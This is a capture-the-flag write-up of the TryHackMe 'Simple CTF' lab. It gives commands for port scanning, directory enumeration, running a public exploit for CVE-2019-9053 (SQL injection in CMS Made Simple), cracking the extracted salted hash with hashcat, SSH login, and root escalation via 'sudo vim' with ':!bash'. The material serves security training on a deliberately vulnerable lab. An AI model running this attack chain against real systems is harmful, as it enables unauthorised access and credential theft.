# TryHackMe: Simple CTF
**Platform:** [TryHackMe](https://tryhackme.com/room/easyctf) | **Difficulty:** Easy

## Executive Summary
This lab demonstrates a complete penetration testing workflow against a Linux target.
The attack path consisted of:
1. Service enumeration
2. Web application discovery
3. SQL injection exploitation
4. Credential extraction
5. Password cracking
6. Privilege escalation via misconfigured sudo permissions

## 1. Reconnaissance: 
Initial port scanning was performed using Nmap.
`nmap -sS -sV -T5 -p- IPADDRESS`
<details>
  <summary>
    <b>Explaination</b>
  </summary>
  
  * **-sS** SYN scan (stealth scan)
  * **-sV** Detect service versions
  * **-T5** Aggressive scan speed
  * **-p-** Scan all 65535 ports
</details>

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Key observation:
- A web server running on port 80

## 2. Web Enumeration
Navigating to: `http://IPADDRESS`

The homepage contained no useful information.

Directory enumeration was performed using Gobuster.

`gobuster dir -u http://IPADDRESS/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
Result:
/simple

Navigate to `http://IPADDRESS/simple/`
This revealed a CMS Made Simple installation.
in the bottom we find the version which is 2.2.8

## 3. Exploitation
Searching for vulnerabilities related to this version revealed:
CVE‑2019‑9053 — SQL Injection

An exploit was available on GitHub.

`git clone https://github.com/Dh4nuJ4/SimpleCTF-UpdatedExploit.git`

Run the exploit:

`python updated_46635.py -u http://IPADDRESS/simple/`

Output:

`[+] Salt for password found: 1dac0d92e9fa6bb2`

`[+] Username found: mitch`

`[+] Email found: admin@admin.com`

`[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96`

## 4. Password Crackng
The extracted hash included a salt.

Create a file: hash.txt

Contents: `0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2`

Crack using Hashcat

`hashcat -m 10 hash.txt /usr/share/wordlists/rockyou.txt`
<details>
  <summary><b>Mode explanation:</b></summary>
  

Mode: 10 Format: md5(pass.salt)
  
Mode: 20 Format: md5(salt.pass)
</details>

Cracked Password: secret

## 5. Initial Access
login via SSH: `ssh -p 2222 mitch@IPADDRESS`

password: secret

## 6. Priviliage Escalation
Check sudo permissions: `sudo -l`

Output: `(root) NOPASSWD: /usr/bin/vim`

This is a misconfigured sudo rule.

Vim allows shell execution.

Run: `sudo vim`

Inside Vim: `:!bash`

This spawns a root shell.

## Root Access Achieved
the system is now fully compromised.

## Attack Path Summary
1. Port scanning with Nmap
2. Directory enumeration with Gobuster
3. CMS version identification
4. Exploiting CVE‑2019‑9053
5. Extracting credentials
6. Cracking password with Hashcat
7. SSH access as `mitch`
8. Privilege escalation via `sudo vim`
